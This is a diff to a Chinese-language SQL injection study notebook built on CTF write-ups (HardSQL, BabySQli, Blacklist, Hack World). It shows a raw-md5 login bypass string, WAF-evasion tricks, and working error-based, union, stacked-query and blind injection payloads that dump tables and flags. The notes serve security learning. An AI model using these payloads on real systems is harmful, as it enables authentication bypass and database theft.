@@ -68,7 +68,49 @@ Basic progress:
 * `--+`同样可以作为注释符，等同于`-- `，但是空格同理会被URL略去，使用URL编码或在后面增加一个字符（使hackbar将空格编码）能够修正错误
 * `/**/`内联注释，等同于空格，用于绕过
 
+### PHP md5 SQL 注入
 
+类型：`select * from usera where username = 'admin' and password = md5($pass,true)`
+
+* `md5(string,raw)`: 将string 计算md5散列，128位，结果根据`raw`参数：
+  * True: 原始 16字符二进制格式（即`chr()`）
+  * False: 32 字符十六进制数 (8b -> 两个十六进制字符)
+
+https://blog.csdn.net/iczfy585/article/details/106081299
+
+1. **数字与字符串比较，只要开头相同即判定为相同**
+
+2. **数字开头字符串不比较（... or str）**，开头为**不为0数字**，则逻辑运算后为1
+
+   ```sql
+   # Example: sql password bypass
+   select * from user where password =''or'1234a';
+   ```
+
+3. md5散列后，只要能转换为`yyy'or'Nxxxx'`，其中N为非0数字，**即可完成SQL注入，绕过password判断**
+
+* 万能密码：`ffifdyop` -> `md5('ffifdyop', True)="'or'6xxxxxx"`
+
+### WAF绕过
+
+https://blog.csdn.net/devil8123665/article/details/108746947
+
+空格绕过：
+
+* 其他符号，注释符
+
+* **括号**
+
+  * 在需要计算的位置增加括号，不会报错
+    ```sql
+    select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'test')
+    ```
+
+
+Union ban:
+
+1. select未被ban：bool盲注 [Example](#[CISCN2019 华北赛区 Day2 Web1]Hack World)
+2. 堆叠注入
 
 ## SQLi-labs
 
@@ -139,7 +181,7 @@ Basic progress:
      
            * ` updatexml(XML_document, XPath_string, new_value)`使用不同xml标记匹配和替换xml块
      
-           * `extractbalue(XML_document, xpath_string)`从目标XML中返回匹配查询的字符串
+           * `extractvalue(XML_document, xpath_string)`从目标XML中返回匹配查询的字符串
      
            * payload
              ```sql
@@ -317,4 +359,137 @@ https://blog.csdn.net/m0_73734159/article/details/134049744
   Finish
   ```
   
+
+### [极客大挑战 2019]HardSQL
+
+* 符号Ban
+  ```
+  ' ', '%09-%0e', '='
+  ```
+
+* 用`()`绕过
+  ```sql
+  'password=123456'or(1)%23		# Login Success
+  ```
+
+* 关键词ban `union, select`
+
+* **报错注入**
+
+```sql
+# Dump table
+'&password=123456'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),0x7e)))%23
+
+# Dump columns
+'&password=123456'or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'H4rDsq1')),0x7e)))%23
+# ~id,username,password~
+
+# Dump table
+'&password=123456'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e)))%23
+# '~flag{e2e491b5-ac46-435d-9b23-ec'
+
+# TOO long, dump latter half
+# Substr,mid banned, use `right`
+'&password=123456'or(extractvalue(1,concat(0x7e,right((select(group_concat(password))from(H4rDsq1)),15),0x7e)))%23
+# 3-ec78133a5786}
+
+# flag{e2e491b5-ac46-435d-9b23-ec78133a5786}
+```
+
+
+
+### [GXYCTF2019]BabySQli
+
+* comment decoded: `select * from user where username = '$name'`
+
+* Ban `or, and` -> `|| &&`
+* Ban `=`
+* Ban `()`
+* **存在报错**
+* 实际发现name查询返回3字段
+
+1. 让原查询返回空，union查询可以用于泄漏字段位置等信息
+   ```sql
+   'name=admn'union select 1,'admin',3 #&pw=123456?
+   # wrong pass, 说明返回的用户名在2上
+   ```
+
+2. 猜测返回 `id, username, password`
+
+3. *源码发现password为md5加密*（目前没有找到不通过加密解决的办法）
+
+4. **手动构造密码记录**
+
+   ```sql
+   'name=admn'union select 1,'admin','202cb962ac59075b964b07152d234b70' #&pw=123
+   ```
+
+
+
+### [GYCTF2020]Blacklist
+
+* 类似qwb2019，提示*Black list is so weak for you,isn't it*
+* 仍然使用堆叠注入得到库名`supersqli`，表名`FlagHere`, `words`
+* select 被ban ： `return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`
+  * qwb`preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`，**增加set，alter, prepare, rename**
+
+* **handler** mysql专用语句，用于逐行读取
+
+  1. HANDLER tbl_name OPEN
+     打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
+  2. HANDLER tbl_name READ FIRST
+     获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
+  3. HANDLER tbl_name CLOSE
+     关闭打开的句柄。
+  4. HANDLER tbl_name READ index_name = value
+     通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。
+
+* ```mysql
+  '?inject=1';handler FlagHere open;handler FlagHere READ FIRST;%23
+  ```
+
+
+
+### [CISCN2019 华北赛区 Day2 Web1]Hack World
+
+* 错误不回显，返回`bool(false)`
+
+* `%23`: `SQL Injection Checked.`
+
+* **Ban**: `# - + ` -> 闭合过滤
+
+* Ban: `or ||`
+
+* Ban: ` ` 括号绕过
+
+* **给出目标表&列，可以盲注**
+
+  ```sql
+  id=(select(1=2))	# Error xxx (null result)
+  id=(select(1=1))	# Hello, xxx
+  ```
+
+* Prototype
+  ```sql
+  # DATA
+  CREATE TABLE test (
+      id INT AUTO_INCREMENT PRIMARY KEY,
+      name VARCHAR(255) NOT NULL,
+      password VARCHAR(255) NOT NULL
+  );
+  INSERT INTO test (name, password) VALUES ('Admin', 'password');
+  INSERT INTO test (name, password) VALUES ('Bob', 'password2');
+  INSERT INTO test (name, password) VALUES ('Charlie', 'password3');
   
+  select(ascii(mid((select(group_concat(name))from(test)),1,1))=0x42)		# 0
+  select(ascii(mid((select(group_concat(name))from(test)),1,1))=0x42)		# 1
+  ```
+
+  * 应对多个记录，增加group_concat
+
+* payload (`group_concat`被ban，但是只有一条记录)
+  ```sql
+  id=(select(ascii(mid((select(flag)from(flag)),{pos},1))={val}))
+  ```
+
+  ![image-20240806221013659](./SQL Study.assets/image-20240806221013659.png)
